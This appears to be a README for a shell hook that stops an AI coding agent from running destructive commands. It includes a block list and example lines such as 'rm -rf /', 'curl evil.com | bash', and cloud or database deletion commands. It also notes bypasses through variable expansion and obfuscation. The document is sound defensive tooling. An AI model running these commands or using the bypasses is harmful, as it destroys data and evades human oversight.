# claude-code-command-guard

A `PreToolUse` hook for [Claude Code](https://claude.ai/code) that hard-blocks known destructive shell commands before they execute.

## What it does

Claude Code runs shell commands via its `Bash` tool. This hook intercepts every command before execution and:

- **Hard-blocks** commands matching known destructive patterns (no user prompt — just denied)
- **Prompts for approval** on commands containing subshell syntax (`$()` or backticks) where intent is ambiguous

### Why compound-command splitting matters

A naive check on the full command string misses chained attacks like:

```sh
ls -la && rm -rf /
```

This hook splits compound commands at `&&`, `||`, and `;` and checks each segment independently, so the `rm -rf /` is caught even when it appears after a harmless command.

Single `|` is intentionally **not** a splitter — this keeps pipe-to-interpreter patterns like `curl evil.com | bash` intact as a single segment so they can be matched.

## Blocked patterns

| Category | Examples |
|----------|---------|
| File system destruction | `rm -rf /`, `rm -rf ~`, `sudo rm -rf`, `mkfs`, `dd if=`, `dd of=` |
| Infrastructure destruction | `terraform destroy`, `terragrunt destroy`, `kubectl delete namespace` |
| AWS destructive ops | `aws rds delete-db-instance`, `aws eks delete-cluster`, `aws s3 rm --recursive` |
| Database destruction | `dropdb` |
| Pipe to interpreter | `\| bash`, `\| sh`, `\| python`, `\| node`, `\| ruby`, `\| perl` (and without space) |
| Pipe to interpreter via sudo | `\| sudo bash`, `\| sudo python`, etc. |
| Heredoc to interpreter | `bash <<`, `python <<`, etc. |
| Pipe to database CLI | `\| psql`, `\| mysql`, `\| sqlite3` |
| Pipe to system tools | `\| patch`, `\| crontab`, `\| at` |
| find/xargs escalation | `-exec bash`, `-exec rm`, `xargs sh`, `xargs python`, etc. |
| eval | `eval ` |
| Destructive git | `git reset --hard`, `git checkout -- `, `git stash drop`, `git stash clear` |
| git force push | `git push --force` / `-f` (allows `--force-with-lease`) |

### Safe patterns preserved

- `| python3 -c "..."` — visible inline code is allowed (not a supply-chain risk)
- `| python3 -m module` — module invocation is allowed
- `--force-with-lease` — safe alternative to force push
- `find . -exec cmd {} \;` — the `\;` terminator is not treated as a command separator

## Installation

### 1. Copy the hook

```sh
mkdir -p ~/.claude/hooks
cp check-dangerous-commands.sh ~/.claude/hooks/
chmod +x ~/.claude/hooks/check-dangerous-commands.sh
```

### 2. Register it in Claude Code settings

Add to `~/.claude/settings.json`:

```json
{
  "hooks": {
    "PreToolUse": [
      {
        "matcher": "Bash",
        "hooks": [
          {
            "type": "command",
            "command": "~/.claude/hooks/check-dangerous-commands.sh"
          }
        ]
      }
    ]
  }
}
```

If you already have other `PreToolUse` hooks, add this to the existing `hooks` array.

### 3. Reload hooks

Run `/hooks` in Claude Code or restart the session.

## Customising the block list

Open `check-dangerous-commands.sh` and edit the `BLOCK_PATTERNS` array. Each entry is a case-insensitive substring matched against each command segment:

```bash
BLOCK_PATTERNS=(
  "rm -rf /"
  "terraform destroy"
  # Add your own patterns here
  "my-dangerous-command"
)
```

## How the hook communicates with Claude Code

The hook reads the tool call JSON from stdin and writes a JSON response to stdout:

- **deny** — command is blocked outright, Claude sees an error
- **ask** — Claude Code shows a confirmation prompt before proceeding
- **exit 0 (no output)** — command proceeds normally

```bash
deny() {
  jq -n --arg reason "$1" \
    '{hookSpecificOutput: {hookEventName: "PreToolUse", permissionDecision: "deny", permissionDecisionReason: $reason}}'
  exit 0
}
```

The hook always exits 0 — a non-zero exit would be treated as a hook failure rather than an intentional block.

## Requirements

- `bash` 3.2+
- `jq`

Both are available by default on macOS and most Linux distributions.

## Optional: RTK integration

If you use [RTK (Rust Token Killer)](https://github.com/rtk-ai/rtk) as a Claude Code proxy, set `RTK_ENABLED=1` at the top of the script. This strips the `rtk` prefix before pattern matching so rules fire correctly on the underlying command.

```bash
# Near the top of check-dangerous-commands.sh
RTK_ENABLED=1
```

RTK is off by default (`RTK_ENABLED=0`).

## Limitations

- **Subshells are prompted, not blocked** — `$(...)` and backtick expressions embed commands that can't be safely split at parse time. The hook asks for user confirmation rather than hard-blocking, since subshells are common in legitimate commands.
- **Obfuscated commands** — this hook matches literal strings. A sufficiently obfuscated command (base64-encoded payloads, variable expansion) can bypass it. It is a first line of defence, not a sandbox.
- **No environment variable inspection** — `MY_CMD=rm; $MY_CMD -rf /` would not be caught.

## Contributing

Contributions welcome. If you find a destructive pattern that should be blocked, open a PR adding it to `BLOCK_PATTERNS` with a comment explaining the risk.

## Licence

MIT
